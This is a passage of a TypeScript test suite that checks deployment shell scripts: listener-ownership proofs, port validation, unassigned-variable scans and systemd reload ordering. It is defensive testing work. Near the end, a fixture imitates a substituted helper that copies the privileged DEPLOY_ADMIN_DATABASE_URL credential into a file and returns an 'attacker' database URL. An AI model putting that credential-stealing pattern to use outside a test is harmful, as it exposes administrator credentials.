  const lock = line(/^\s*acquire_cutover_lock$/)
  const resolve = line(/^resolve_app_port \|\| true$/)
  const reStop = line(/^\s*info "Re-stopping \$\{SERVICE_UNIT\} before anything else/)
  const adopted = line(/^\s*warn "Fence adopted\. Continuing; every step is idempotent\."$/)
  const gate = line(/^if \[\[ -z "\$\{APP_PORT\}" \]\]; then$/)
  const mismatch = line(/^\s*die "\$\{APP_DIR\}\/\.env says APP_PORT=/)
  const pull = line(/^if ! \$NO_GIT; then$/)
  const stop = line(/^run systemctl stop "\$\{SERVICE_UNIT\}"$/)
  const migrate = phaseLine(UPDATE_LINES, 'migrate')

  assert.ok(trap < lock, 'precondition: the exit trap is installed before the lock')
  assert.ok(lock < resolve, 'the port is resolved under the cutover lock')
  assert.ok(resolve < reStop, 'and before the adoption, whose predecessor probe uses it as evidence')
  assert.ok(adopted < gate, 'the gate is AFTER the adoption — the fence is re-established before anything can refuse')
  assert.ok(gate < mismatch, 'precondition: the two refusals are one block')
  assert.ok(mismatch < pull, 'and before the pull')
  assert.ok(pull < stop && stop < migrate, 'precondition: the pull, the stop and the migration are all still ahead of it')

  // And nothing between the read and the gate can refuse over the port: the initialisation is
  // where the value is READ and nowhere else does it die about one.
  const initialisation = UPDATE_LINES.slice(0, lock).filter(isCode).join('\n')
  assert.ok(/^ENV_FILE_APP_PORT="/m.test(initialisation), 'precondition: the read is still in the initialisation')
  assert.ok(
    !/valid_tcp_port "\$\{(ENV_FILE_)?APP_PORT\}"/.test(initialisation),
    'no port validation may run before the cutover lock and the adoption',
  )
})

// ---------------------------------------------------------------------------
// AND WHOSE SOCKET ANSWERED — prove_service_owns_port() run for real against real processes and
// real /proc data (o3d-2sm1.5 r27, Codex HIGH).
//
// `ss` is stubbed, so the shipped pipeline that turns its output into pids runs for real;
// `systemctl` answers ControlGroup and MainPID from the fixture. Everything that decides is the
// shipped code reading /proc for processes this test actually started.
//
// VERIFIED AGAINST THIS HOST'S REAL SERVICES as well, outside the test run and read-only: with
// SERVICE_UNIT=ims-stage-dev.service the proof accepts :3000 (the listener is the next-server
// grandchild of the unit's MainPID, inside its control group) and REFUSES :3002, which is the
// e2e rig — the exact confusion an .env naming the wrong port would have produced.
// ---------------------------------------------------------------------------
function runSocketProof(options: {
  pids: number[]
  cgroup: string
  mainPid: number
  port?: string
  /** Listening rows on the same port that `ss` attributes to NO pid — the r28 case. */
  unattributed?: number
}): { status: number; output: string } {
  const source = UPDATE_LINES.join('\n')
  const port = options.port ?? '3000'
  // A row with no `users:(…)` column at all is what `ss -ltnp` prints for a socket whose owning
  // process this invocation cannot see. It is a LISTENER; it is simply not attributable.
  const unattributedRows = Array.from(
    { length: options.unattributed ?? 0 },
    () => `LISTEN 0 511 0.0.0.0:${port} 0.0.0.0:*`,
  )
  const rows = options.pids
    .map((pid) => `LISTEN 0 511 0.0.0.0:${port} 0.0.0.0:* users:(("next-server",pid=${pid},fd=20))`)
    .concat(unattributedRows)
    .join('\n')
  const program = [
    'set -uo pipefail',
    `APP_PORT='${port}'`,
    'SERVICE_UNIT=app.service',
    'RESPONDER_PIDS=""; RESPONDER_REASON=""',
    'PORT_LISTENER_ROWS=0; PORT_LISTENER_UNATTRIBUTED=0; PORT_LISTENER_PIDS=""',
    `STUB_CGROUP='${options.cgroup}'`,
    `STUB_MAINPID=${options.mainPid}`,
    `ss(){ printf '%s\\n' '${rows}'; }`,
    'systemctl(){ case "$*" in *ControlGroup*) echo "$STUB_CGROUP" ;; *MainPID*) echo "$STUB_MAINPID" ;; esac; return 0; }',
    shellFunction(source, 'port_listener_scan'),
    shellFunction(source, 'pid_in_service_cgroup'),
    shellFunction(source, 'pid_in_service_process_tree'),
    shellFunction(source, 'prove_service_owns_port'),
    'if prove_service_owns_port; then echo "PROVEN=${RESPONDER_PIDS}"; else echo "UNPROVEN=${RESPONDER_REASON}"; fi',
  ].join('\n')
  return runShell(`bash -s <<'IMS_SOCKET_PROOF_EOF'\n${program}\nIMS_SOCKET_PROOF_EOF`)
}

test('the health check proves the socket on the port belongs to the service, not merely that something answered', () => {
  const listener = spawn('sleep', ['30'], { stdio: 'ignore' })
  const stranger = spawn('sleep', ['30'], { stdio: 'ignore' })
  try {
    const pid = listener.pid as number
    const other = stranger.pid as number
    const cgroup = (readFileSync(`/proc/${pid}/cgroup`, 'utf8').split('\n')[0] ?? '').replace(/^\d+::/, '')

    // POSITIVE CONTROL FIRST: a proof that can only ever fail would make every refusal below
    // vacuous, and a health check that can never pass is a deterministic post-migration outage.
    const proven = runSocketProof({ pids: [pid], cgroup, mainPid: other })
    assert.match(proven.output, new RegExp(`^PROVEN=${pid}$`, 'm'), `a listener inside the unit's control group is the service:\n${proven.output}`)

    // MUTATION ROUTE: delete the cgroup branch from prove_service_owns_port() and the control
    // above reports UNPROVEN; delete the process-tree branch and the second control does.
    const byTree = runSocketProof({ pids: [pid], cgroup: '/system.slice/something-else.service', mainPid: pid })
    assert.match(byTree.output, /^PROVEN=/m, `the process-tree route must cover a host whose cgroup line this cannot match:\n${byTree.output}`)

    const stale = runSocketProof({ pids: [other], cgroup: '/system.slice/something-else.service', mainPid: pid })
    assert.match(stale.output, /^UNPROVEN=/m, `a listener belonging to neither route is not the service:\n${stale.output}`)
    assert.match(stale.output, new RegExp(`pid ${other} holds the listening socket on :3000`), 'and the refusal must name it')

    // "One of them is ours" is not an answer to "which process did the health check reach".
    // pid 1 is in neither: its cgroup is the init scope, and the tree walk from it stops
    // immediately. Two siblings spawned by this test share a cgroup, so `other` would NOT do.
    const shared = runSocketProof({ pids: [pid, 1], cgroup, mainPid: pid })
    assert.match(shared.output, /^UNPROVEN=/m, `an unattributable second holder of the port fails the whole proof:\n${shared.output}`)

    const nobody = runSocketProof({ pids: [], unattributed: 1, cgroup, mainPid: other })
    assert.match(nobody.output, /^UNPROVEN=/m, `a socket ss attributes to no pid proves nothing:\n${nobody.output}`)
    assert.match(nobody.output, /attributes 1 of them to no pid at all/, 'and says so')

    // AND THE MIXED CASE, WHICH IS THE r28 FINDING (Codex HIGH). One row the unit owns outright,
    // one row `ss` can attribute to nobody. The old reader grepped `pid=` out of the rows and
    // discarded the second, leaving a non-empty list containing only the trusted pid — every
    // member of which then verified, so the proof PASSED. With SO_REUSEPORT the kernel may have
    // handed the health request to the socket nobody could name.
    //
    // MUTATION ROUTE (both verified by making the change locally and re-running): restore the old
    // one-pipeline reader —
    //   ss -ltnp 2>/dev/null | awk -v p=":${APP_PORT}\$" '$4 ~ p' | grep -oE 'pid=[0-9]+' | cut -d= -f2 | sort -u
    // — as port_listener_scan()'s body (setting PORT_LISTENER_PIDS from it) and this case reports
    // PROVEN; alternatively delete the PORT_LISTENER_UNATTRIBUTED refusal from
    // prove_service_owns_port() and it reports PROVEN while `nobody` above still fails.
    const mixed = runSocketProof({ pids: [pid], unattributed: 1, cgroup, mainPid: pid })
    assert.match(
      mixed.output,
      /^UNPROVEN=/m,
      `one attributed listener beside one unattributable one is not a proof:\n${mixed.output}`,
    )
    assert.match(mixed.output, /shows 2 listening socket\(s\) on :3000 and attributes 1 of them to no pid at all/, 'and it must count the rows, not the pids')
    assert.match(mixed.output, /an unknown and not an absent one/i, 'and say why a missing attribution is not a missing listener')

    // AND THE CONTROL FOR IT: the same two rows with the second one attributed to the same unit
    // still passes, so the refusal above is about ATTRIBUTION and not about there being two rows.
    const twoOwned = runSocketProof({ pids: [pid, pid], cgroup, mainPid: pid })
    assert.match(twoOwned.output, /^PROVEN=/m, `two rows both belonging to the unit are still the unit:\n${twoOwned.output}`)

    // No rows at all is a different refusal from a row nobody owns, and it says so.
    const noRows = runSocketProof({ pids: [], cgroup, mainPid: other })
    assert.match(noRows.output, /reports no listening socket on that port at all/, `nothing listening is its own answer:\n${noRows.output}`)
  } finally {
    listener.kill('SIGKILL')
    stranger.kill('SIGKILL')
  }
})

test('the socket proof is what stands between the health check and the point of no return', () => {
  // Structural, and it is the ordering that matters: the proof must run while the teardown window
  // is still open, so a failure is stopped and re-fenced rather than reported as a success.
  //
  // MUTATION ROUTE: move the `prove_service_owns_port || die` below the PAST_POINT_OF_NO_RETURN
  // assignment and the second assertion fails.
  const proof = UPDATE_LINES.findIndex((line) => isCode(line) && /^\s*prove_service_owns_port \|\| die \\$/.test(line))
  assert.notEqual(proof, -1, 'the health check must attribute the responding socket to the unit')
  const health = UPDATE_LINES.findIndex((line) => isCode(line) && /curl -fsS --max-time 5 "http:\/\/127\.0\.0\.1:\$\{APP_PORT\}\/api\/health"/.test(line))
  const armed = UPDATE_LINES.findIndex((line) => isCode(line) && /^\s*PAST_POINT_OF_NO_RETURN=true$/.test(line))
  assert.ok(health !== -1 && armed !== -1, 'precondition: the poll and the point of no return are both still there')
  assert.ok(health < proof && proof < armed, 'the proof runs after the poll and before the point of no return')
})

test('valid_tcp_port is the same function in all three entrypoints, and it accepts exactly 1-65535', () => {
  // One shape check, three copies, kept honest the way env_file_value() is.
  //
  // MUTATION ROUTE: change `65535` to `65536` in any one copy and the equality below names that
  // script; change it in all three and the range assertions below fail on 65536.
  const bodies = R9_SCRIPTS.map((entry) => ({
    name: entry.name,
    body: entry.source.slice(entry.source.indexOf('valid_tcp_port() {')).split('\n}\n')[0],
  }))
  assert.ok(bodies[0].body.includes('10#'), 'precondition: the function was found, not an empty slice')
  for (const other of bodies.slice(1)) {
    assert.equal(other.body, bodies[0].body, `${other.name} carries a different valid_tcp_port() from ${bodies[0].name}`)
  }

  // And each script actually CALLS it on the port it will build a health URL out of — a shared
  // function nobody invokes is not a check. MUTATION ROUTE: delete any one call site and this
  // names that script.
  //
  // update.sh takes THREE candidate ports since r27 — the invocation's, the unit's ExecStart and
  // the unit's Environment=PORT= — and a single call site would leave two of them unchecked, so
  // all three are named. (.env's APP_PORT is checked too, at the port gate; it is not a candidate
  // and is covered by its own tests.)
  const CALL_SITES: ReadonlyArray<{ name: string; call: RegExp }> = [
    { name: 'update.sh', call: /^\s*if ! valid_tcp_port "\$\{IMS_APP_PORT\}"; then$/m },
    { name: 'update.sh', call: /^\s*if \[\[ -n "\$env_port" \]\] && ! valid_tcp_port "\$env_port"; then$/m },
    { name: 'update.sh', call: /^\s*if ! valid_tcp_port "\$value"; then$/m },
    { name: 'install.sh', call: /^valid_tcp_port "\$\{APP_PORT\}" \|\| die /m },
    { name: 'deploy.sh', call: /^valid_tcp_port "\$\{PORT\}" \|\| die /m },
  ]
  for (const site of CALL_SITES) {
    const entry = R9_SCRIPTS.find((candidate) => candidate.name === site.name)
    assert.ok(entry, `${site.name} must be one of the three entrypoints`)
    assert.match(entry.source, site.call, `${site.name} defines valid_tcp_port but never applies it to a port it would poll: ${site.call}`)
  }

  const program = [bodies[0].body, '}', 'for p in "$@"; do if valid_tcp_port "$p"; then echo "ok:$p"; else echo "no:$p"; fi; done'].join('\n')
  const result = runShell(`bash -s -- 1 80 3000 65535 0 65536 "" abc " 80" 08 +80 -80 3000x <<'IMS_PORT_EOF'\n${program}\nIMS_PORT_EOF`)
  assert.equal(result.status, 0, `the harness must run cleanly:\n${result.output}`)
  for (const good of ['ok:1', 'ok:80', 'ok:3000', 'ok:65535', 'ok:08']) {
    assert.match(result.output, new RegExp(`^${good.replace('+', '\\+')}$`, 'm'), `${good} must be accepted:\n${result.output}`)
  }
  for (const bad of ['no:0', 'no:65536', 'no:', 'no:abc', 'no: 80', 'no:+80', 'no:-80', 'no:3000x']) {
    assert.match(result.output, new RegExp(`^${bad.replace('+', '\\+')}$`, 'm'), `${bad} must be rejected:\n${result.output}`)
  }
})

test('update.sh never reads a shell variable that only the deleted `source` could have supplied', () => {
  // WHAT THE r24 LIST WAS REALLY FOR, generalised. Removing the two `source` calls means every
  // name that used to arrive by being exported out of .env or .deploy-meta now has to be read
  // explicitly — and a name that is neither read nor assigned is a `set -u` abort on a
  // production update, not a fallback. (That is not hypothetical: this scan is what found
  // DB_ENV_SNAPSHOT_DROPIN_FILE, used in five places in update.sh and assigned in none.)
  //
  // So: every UPPER_SNAKE variable update.sh EXPANDS without a `:-`/`-` default, minus every one
  // it assigns, must be empty. A name legitimately supplied by the root invocation is always
  // expanded with a default, so it does not appear here.
  //
  // MUTATION ROUTE: delete the `DB_ENV_SNAPSHOT_DROPIN_FILE=` assignment (or the DATABASE_URL
  // one) from update.sh and this reports it by name.
  //
  // AND THE LIBRARY IS PART OF update.sh's SURFACE NOW (o3d-2sm1.5 r31): it is sourced, so a name
  // it expands is a name this run expands. It is scanned as one file with update.sh, and the
  // per-entrypoint half of the same question — does EVERY entrypoint define what the shared
  // library reads — is the test immediately below.
  const LIBRARY_LINES = [
    ...readFileSync(join(process.cwd(), 'scripts/lib/db-fence-protected.sh'), 'utf8').split(/\r?\n/),
    // …and the crontab exclusion, sourced by all three entrypoints since o3d-p9dq. It assigns
    // CRONTAB_LOCK_FILE, CRONTAB_LOCK_CONFLICT and CRONTAB_LOCK_WAIT_SECONDS, which update.sh
    // expands with no default — so leaving it out of this scan reports three names as unsupplied.
    ...readFileSync(join(process.cwd(), 'scripts/lib/crontab-lock.sh'), 'utf8').split(/\r?\n/),
  ]
  const label = 'update.sh'
  const code = [...UPDATE_LINES, ...LIBRARY_LINES].filter((line) => !/^\s*#/.test(line))

  const assigned = new Set<string>()
  for (const line of code) {
    for (const match of line.matchAll(/(?:^|[\s;&|({])(?:export\s+|local\s+(?:-\w+\s+)?|declare\s+(?:-\w+\s+)?|readonly\s+)?([A-Z][A-Z0-9_]*)(?:\+?=|\[)/g)) {
      assigned.add(match[1])
    }
    for (const match of line.matchAll(/\b(?:local|declare|readonly|unset|export)\s+((?:-\w+\s+)?[A-Z][A-Z0-9_ ]*)/g)) {
      for (const name of match[1].split(/\s+/)) if (/^[A-Z][A-Z0-9_]*$/.test(name)) assigned.add(name)
    }
    for (const match of line.matchAll(/\bfor\s+([A-Z][A-Z0-9_]*)\s+in\b/g)) assigned.add(match[1])
    for (const match of line.matchAll(/\bread\s+(?:-\w+\s+)*((?:[A-Z][A-Z0-9_]*\s*)+)/g)) {
      for (const name of match[1].trim().split(/\s+/)) assigned.add(name)
    }
    for (const match of line.matchAll(/printf\s+-v\s+"?([A-Z][A-Z0-9_]*)/g)) assigned.add(match[1])
  }

  // Set by bash itself, or by the shell that invoked the script.
  const SHELL_PROVIDED = new Set([
    'PATH', 'HOME', 'PWD', 'OLDPWD', 'SHELL', 'USER', 'LOGNAME', 'TERM', 'LANG', 'TMPDIR',
    'EUID', 'UID', 'PPID', 'BASHPID', 'HOSTNAME', 'OSTYPE', 'IFS', 'RANDOM', 'SECONDS', 'LINENO',
    'FUNCNAME', 'BASH_SOURCE', 'BASH_REMATCH', 'PIPESTATUS', 'REPLY', 'PS4', 'SUDO_USER',
    // Not the shell's at all: `awk '{print $NF}'` inside a single-quoted program, which bash
    // never expands. Listed by name rather than by skipping every line containing `awk`, so a
    // real shell variable on such a line is still caught.
    'NF',
  ])

  const undefined_: string[] = []
  for (const line of code) {
    // `${NAME}` and `$NAME`, but NOT `${NAME:-…}` / `${NAME-…}` / `${NAME:=…}` / `${#NAME…}` /
    // `${NAME[@]…}` — a default is the script saying "this may be absent", which is the case
    // this test is not about.
    //
    // AND NOT `\$NAME`, which is a LITERAL dollar and not an expansion at all (o3d-p9dq). Several
    // operator-facing messages quote `$STATE_DIRECTORY` and `$BASE_URL` by name; counting those as
    // reads reports a variable the script never expands, and the fix a reader would then make is
    // to assign something nothing uses.
    for (const match of line.matchAll(/(?<!\\)\$\{([A-Z][A-Z0-9_]*)\}|(?<!\\)\$([A-Z][A-Z0-9_]*)\b/g)) {
      const name = match[1] ?? match[2]
      if (!assigned.has(name) && !SHELL_PROVIDED.has(name)) undefined_.push(name)
    }
  }

  assert.deepEqual(
    Array.from(new Set(undefined_)).sort(),
    [],
    `${label} (with the library it sources) expands these with no default and never assigns them: nothing supplies them and \`set -u\` aborts the run`,
  )
})

test('every entrypoint defines what the shared fence library reads', () => {
  // THE OTHER HALF OF THE SCAN ABOVE, and the one that is about r31 specifically. All three
  // entrypoints source scripts/lib/db-fence-protected.sh, and it EXPANDS names it does not
  // assign — DB_FENCE_SCRIPT above all, which is the checkout path each entrypoint spells
  // differently (${APP_DIR} here, ${APP_DIR_REAL} in deploy.sh). An entrypoint that sources the
  // library without defining one of those aborts on `set -u` at the first fence, which is after
  // the stop.
  //
  // Scoped to the LIBRARY'S OWN reads rather than to whole-script scans of deploy.sh and
  // install.sh: those two assign through `read`, prompt helpers and `source /etc/os-release`,
  // which a line-based scan cannot see, and a test that reported forty false names would be
  // switched off rather than read. Named here so the narrowing is deliberate.
  //
  // MUTATION ROUTE: delete the `DB_FENCE_SCRIPT=` line from install.sh and this fails naming
  // install.sh and DB_FENCE_SCRIPT; add `echo "${DB_FENCE_NOWHERE}"` to the library and it fails
  // for all three.
  // BOTH shared libraries, for the same reason (o3d-p9dq added the second): each is sourced by
  // all three entrypoints and each expands names the entrypoint must supply — DB_FENCE_SCRIPT for
  // the fence, APP_USER for the crontab lock's refusal messages.
  const libCode = ['scripts/lib/db-fence-protected.sh', 'scripts/lib/crontab-lock.sh']
    .flatMap((rel) => readFileSync(join(process.cwd(), rel), 'utf8').split(/\r?\n/))
    .filter((line) => !/^\s*#/.test(line))

  const libAssigned = new Set<string>()
  for (const line of libCode) {
    for (const match of line.matchAll(/(?:^|[\s;&|({])(?:export\s+|local\s+(?:-\w+\s+)?|readonly\s+)?([A-Z][A-Z0-9_]*)(?:\+?=|\[)/g)) {
      libAssigned.add(match[1])
    }
    for (const match of line.matchAll(/\b(?:local|declare|readonly|unset|export)\s+((?:-\w+\s+)?[A-Z][A-Z0-9_ ]*)/g)) {
      for (const name of match[1].split(/\s+/)) if (/^[A-Z][A-Z0-9_]*$/.test(name)) libAssigned.add(name)
    }
  }

  const needed = new Set<string>()
  for (const line of libCode) {
    // `\$NAME` is a literal dollar in an operator message, not an expansion — see the scan above.
    for (const match of line.matchAll(/(?<!\\)\$\{([A-Z][A-Z0-9_]*)\}|(?<!\\)\$([A-Z][A-Z0-9_]*)\b/g)) {
      const name = match[1] ?? match[2]
      if (!libAssigned.has(name)) needed.add(name)
    }
  }
  // PRECONDITION, so this is not a test of an empty set: the library really does depend on the
  // entrypoint for the one thing it must not decide for itself — where the checkout's helper is.
  assert.ok(needed.has('DB_FENCE_SCRIPT'), `the library must read DB_FENCE_SCRIPT from its caller (${[...needed]})`)
  assert.ok(needed.has('APP_USER'),
    `the crontab lock library must read APP_USER from its caller (${[...needed]})`)

  for (const [label, lines] of [['update.sh', UPDATE_LINES], ['deploy.sh', DEPLOY_LINES], ['install.sh', INSTALL_LINES]] as const) {
    const source = lines.filter((line) => !/^\s*#/.test(line)).join('\n')
    // `readonly` is a declaration prefix here too since o3d-secops.
    const missing = [...needed].filter((name) => !new RegExp(`(^|\\n)\\s*((export|readonly)\\s+)?${name}=`).test(source))
    assert.deepEqual(missing, [], `${label} sources the fence library but never assigns what it reads`)
    // AND IT REALLY SOURCES IT, from its own directory rather than from an application path.
    assert.match(
      source,
      /IMS_SCRIPT_LIB_DIR="\$\(cd "\$\(dirname "\$\{BASH_SOURCE\[0\]\}"\)" && pwd\)\/lib"/,
      `${label} must resolve the library beside itself, not under an application-writable directory`,
    )
    assert.match(source, /source "\$\{IMS_SCRIPT_LIB_DIR\}\/db-fence-protected\.sh"/, `${label} must source it`)
    assert.match(source, /source "\$\{IMS_SCRIPT_LIB_DIR\}\/crontab-lock\.sh"/,
      `${label} must source the crontab exclusion from the same place`)
  }
})

// ---------------------------------------------------------------------------
// o3d-2sm1.5 r24, Codex HIGH #2 — A COMMAND THAT RELOADS SYSTEMD WITHOUT SAYING SO.
//
// `systemctl unmask` and `systemctl enable` reload the daemon IMPLICITLY unless given
// --no-reload (systemctl(1): "When used with enable, disable, preset, mask, or unmask, do not
// implicitly reload daemon configuration after executing the changes"). deploy.sh unmasked inside
// its start loop, update.sh on the line above its start, and install.sh started with
// `enable --now` — so all three re-read every unit file and drop-in on disk AFTER
// require_start_identity_bound had proved the loaded configuration binds the service to this
// run's environment snapshot. r22's atomicity argument was sound about EXPLICIT reloads and
// blind to the implicit one, which is why the claim is now re-derived from the commands actually
// in the window rather than from the ones the argument remembered.
// ---------------------------------------------------------------------------

/** Every systemctl verb that can change what systemd has loaded, explicitly or implicitly. */
const RELOAD_CAPABLE_VERBS = /systemctl\s+(?:[^\n]*\s)?(daemon-reload|daemon-reexec|enable|disable|preset|preset-all|mask|unmask|reenable|link|revert|set-property|edit)\b/

const START_WINDOWS = [
  { name: 'deploy.sh', lines: DEPLOY_LINES },
  { name: 'update.sh', lines: UPDATE_LINES },
  { name: 'install.sh', lines: INSTALL_LINES },
] as const

/** The command that starts the service, as a LINE — not a mention of it inside a refusal banner. */
const START_COMMAND = /^\s*(run\s+)?systemctl start\b/

/**
 * The executable lines between the final binding proof and the systemctl start that follows it.
 *
 * The proof is `require_start_identity_bound || die \` followed by a multi-line banner, and that
 * banner CONTAINS the words "systemctl start". A first draft of this searched for that text and
 * located the window's end on the banner itself, one line after its start — so the window came
 * back empty for two of the three entrypoints and the assertions over it examined nothing. The
 * banner is consumed by quote-counting and the end is matched as a COMMAND, and the callers below
 * prove the result is not vacuous by re-running the same extraction over a mutated copy.
 */
function startWindowBounds(lines: string[]): { from: number; to: number } {
  const proof = lines.findIndex((line) => /^require_start_identity_bound\s*\|\|/.test(line))
  assert.notEqual(proof, -1, 'the entrypoint must still prove the binding before it starts anything')

  // Walk off the end of the refusal banner. The proof is `require_start_identity_bound || die \`
  // and its argument is one double-quoted string on the following line(s), so BOTH conditions
  // have to be consumed: a trailing backslash continues the command, and an odd running
  // double-quote count means the string is still open. Counting quotes alone stops on the proof
  // line itself (it has none), which put the banner inside the window — and the banner mentions
  // "systemctl start", so the assertions below skipped it and examined nothing.
  let cursor = proof
  let quotes = 0
  for (;;) {
    quotes += (lines[cursor].match(/"/g) ?? []).length
    const continued = lines[cursor].trimEnd().endsWith('\\')
    cursor += 1
    if ((!continued && quotes % 2 === 0) || cursor >= lines.length) break
  }

  const start = lines.findIndex((line, index) => index >= cursor && START_COMMAND.test(line))
  assert.notEqual(start, -1, 'and it must still start the service after it')
  return { from: cursor, to: start }
}

function startWindow(lines: string[]): string[] {
  const { from, to } = startWindowBounds(lines)
  return lines.slice(from, to).filter((line) => isCode(line))
}

/**
 * The same script with a reload-capable command spliced into the window, to prove the guard bites.
 *
 * It splices at the window's OWN end, not at the first `systemctl start` in the file: install.sh
 * starts postgresql hundreds of lines earlier, and a fixture that spliced there would insert the
 * command outside the window and then report that the window could not see it.
 */
function withUnmaskInTheWindow(lines: string[]): string[] {
  const { to } = startWindowBounds(lines)
  return [...lines.slice(0, to), '  run systemctl unmask "$unit" >/dev/null 2>&1 || true', ...lines.slice(to)]
}

for (const entry of START_WINDOWS) {
  test(`${entry.name} runs no unit-file command between the binding proof and the start`, () => {
    // MUTATION ROUTE: put `run systemctl unmask "$unit"` back into the start loop (deploy.sh), or
    // on the line above the start (update.sh), or restore `systemctl enable --now` (install.sh),
    // and the window contains a reload-capable verb again.
    const window = startWindow(entry.lines)
    const offenders = window.filter((line) => RELOAD_CAPABLE_VERBS.test(line))
    assert.deepEqual(
      offenders,
      [],
      `${entry.name} invalidates its own binding proof: these run after it and reload unit configuration:\n${offenders.join('\n')}`,
    )

    // AND THE GUARD IS NOT VACUOUS. update.sh's window is legitimately two lines long, so "no
    // offenders" would also be the answer if the extraction had located nothing at all — which is
    // exactly the bug the comment over startWindow() describes. The same extraction, over the same
    // script with one unmask spliced in above the start, must come back with that unmask.
    const caught = startWindow(withUnmaskInTheWindow(entry.lines)).filter((line) => RELOAD_CAPABLE_VERBS.test(line))
    assert.equal(caught.length, 1, `the extraction for ${entry.name} must be able to SEE a command in the window: ${caught}`)

    // AND THE ENUMERATION IS COMPLETE, which is the half the previous round got wrong: it is not
    // enough that the commands someone remembered are safe. Every executable line in the window
    // must be one of the shapes below, so a command nobody thought about fails here rather than
    // being reasoned past.
    const unexplained = window.filter(
      (line) =>
        !/^\s*(if|then|else|elif|fi|for|do|done)\b/.test(line) &&
        !/^\s*[A-Z_]+=/.test(line) &&
        !/^\s*(echo|info|ok|success|step|header|warn)\b/.test(line) &&
        !/systemctl start/.test(line) &&
        !/nohup npm start|as_app_user\b/.test(line),
    )
    assert.deepEqual(unexplained, [], `${entry.name} has a command in the window that this test cannot account for:\n${unexplained.join('\n')}`)
  })

  test(`${entry.name} does every unmask and enable BEFORE the final daemon-reload`, () => {
    // The reorder, not the flag: `--no-reload` would leave the invariant depending on every
    // future caller remembering it, while moving the operations makes "nothing after the proof
    // changes the loaded configuration" true by construction.
    //
    // MUTATION ROUTE: move the unmask (or install.sh's enable) back below remove_reboot_fence.
    const source = entry.lines.join('\n')
    const code = entry.lines.map((line, index) => ({ line, index })).filter(({ line }) => isCode(line))
    const lastReload = code.filter(({ line }) => /^\s*remove_reboot_fence\s*$/.test(line)).pop()
    assert.notEqual(lastReload, undefined, `${entry.name} must still issue its final reload through remove_reboot_fence`)

    // Scoped to the window that matters: the final reload up to the start. install.sh enables
    // unattended-upgrades and fail2ban further down, long after the application is serving, and a
    // reload there cannot affect a unit that is already running.
    const startLine = code.find(({ line, index }) => index > (lastReload as { index: number }).index && START_COMMAND.test(line))
    assert.notEqual(startLine, undefined, `${entry.name} must still start the service after its final reload`)
    const late = code.filter(
      ({ line, index }) =>
        index > (lastReload as { index: number }).index &&
        index < (startLine as { index: number }).index &&
        RELOAD_CAPABLE_VERBS.test(line),
    )
    assert.deepEqual(late.map(({ line }) => line), [], `${entry.name} changes unit configuration after its final daemon-reload and before the start:\n${late.map(({ line }) => line).join('\n')}`)

    // The unmask/enable this moved must be UPSTREAM of that reload, which is the reorder itself.
    const lifts = code.filter(({ line }) => /systemctl (unmask|enable) "\$/.test(line) || /systemctl (unmask|enable) "\$\{/.test(line))
    assert.notEqual(lifts.length, 0, `${entry.name} must still lift the mask (or register the unit) it used to do late`)
    for (const lift of lifts) {
      assert.ok(
        lift.index < (lastReload as { index: number }).index,
        `${entry.name} runs "${lift.line.trim()}" after its final daemon-reload; it reloads implicitly and must happen before it`,
      )
    }

    void source
  })
}

test('the entrypoints no longer claim an atomicity that only covered explicit reloads', () => {
  // The banner is what an operator reads at 03:00, so it has to say the true thing. The old text
  // was "Nothing between here and systemctl start issues another daemon-reload", which was a
  // statement about the verb `daemon-reload` and not about the commands in the window.
  //
  // MUTATION ROUTE: revert either banner to the daemon-reload-only wording.
  for (const entry of [
    { name: 'deploy.sh', source: DEPLOY_LINES.join('\n') },
    { name: 'update.sh', source: UPDATE_LINES.join('\n') },
  ]) {
    assert.match(
      entry.source,
      /NOTHING BETWEEN HERE AND THE START RUNS A UNIT-FILE COMMAND AT ALL/,
      `${entry.name}'s refusal banner must state the claim the reorder actually establishes`,
    )
    assert.ok(
      !/Nothing between here and systemctl start issues another daemon-reload/.test(entry.source),
      `${entry.name} still carries the claim that was true of explicit reloads and false of the implicit one`,
    )
  }
})

// ---------------------------------------------------------------------------
// r31: SUBSTITUTION AT WRITE (o3d-2sm1.5, Codex CRITICAL x2)
//
// r29 closed DELETION of the fence helper. r30 closed SUBSTITUTION AT READ — the root-owned copy
// wins whenever it exists. Neither closed SUBSTITUTION AT WRITE: the publication step still took
// whatever was in the application-owned checkout and promoted it into the protected path on every
// fence, so the account being defended against supplied the trusted artefact, and the digest
// recorded beside it proved only that the substitution was consistent with itself. And deploy.sh
// and install.sh never resolved at all: they handed DEPLOY_ADMIN_DATABASE_URL straight to
// ${APP_DIR}/scripts/fence-db-connections.mjs.
//
// The two tests below are the load-bearing ones. Both run REAL node processes through the
// shipped functions of all three entrypoints, so "the substituted code never ran" is answered by
// the filesystem rather than by reading the source.
// ---------------------------------------------------------------------------

/**
 * A fence helper that records every invocation, and answers the two modes the callers read.
 *
 * IT DOES NOT WRITE THE AUTHORITY RECORD, and since o3d-secops r26 that matters rather than merely
 * being tidier. It used to drop `{}` at ${DB_FENCE_STATE} on `--fence`, which is what the helper
 * did before r23 moved the publication to root — so the stub was OVERWRITING root's own record
 * with a shapeless one, and the second phase of the test below was then re-fencing over an object
 * with no `fence_applied` key. r25 read that as a standing fence and published `recovery`; r26
 * refuses it, correctly, and the refusal was the stub's leftover rather than the code's. The
 * shipped `--fence` writes no file at all — it runs as ${APP_USER} and cannot — so neither does
 * this.
 */
function shippedHelper(dir: string): string {
  return [
    "import { appendFileSync, writeFileSync } from 'node:fs'",
    `appendFileSync(${JSON.stringify(join(dir, 'calls.log'))}, 'SHIPPED ' + process.argv.slice(2).join(' ') + '\\n')`,
    "if (process.argv.includes('--print-migration-url')) {",
    "  process.stdout.write('postgres://admin@127.0.0.1/nowhere?options=-c%20role%3Dimsapp\\n')",
    '}',
    'process.exit(0)',
    '',
  ].join('\n')
}

/**
 * What the application account would put there instead. It STEALS: if it is ever executed it
 * writes the privileged credential out of its own environment, which is the finding stated as a
 * file that either exists or does not.
 */
function substitutedHelper(dir: string): string {
  return [
    "import { appendFileSync, writeFileSync } from 'node:fs'",
    `appendFileSync(${JSON.stringify(join(dir, 'calls.log'))}, 'SUBSTITUTED ' + process.argv.slice(2).join(' ') + '\\n')`,
    `writeFileSync(${JSON.stringify(join(dir, 'STOLEN'))}, String(process.env.DEPLOY_ADMIN_DATABASE_URL ?? ''))`,
    "if (process.argv.includes('--print-migration-url')) {",
    "  process.stdout.write('postgres://attacker@127.0.0.1/nowhere?options=-c%20role%3Dimsapp\\n')",
    '}',
    'process.exit(0)',
    '',
  ].join('\n')
}

for (const entry of FENCE_HARNESS) {
  test(`${entry.name}: a helper substituted in the checkout is neither promoted nor handed the credential`, () => {
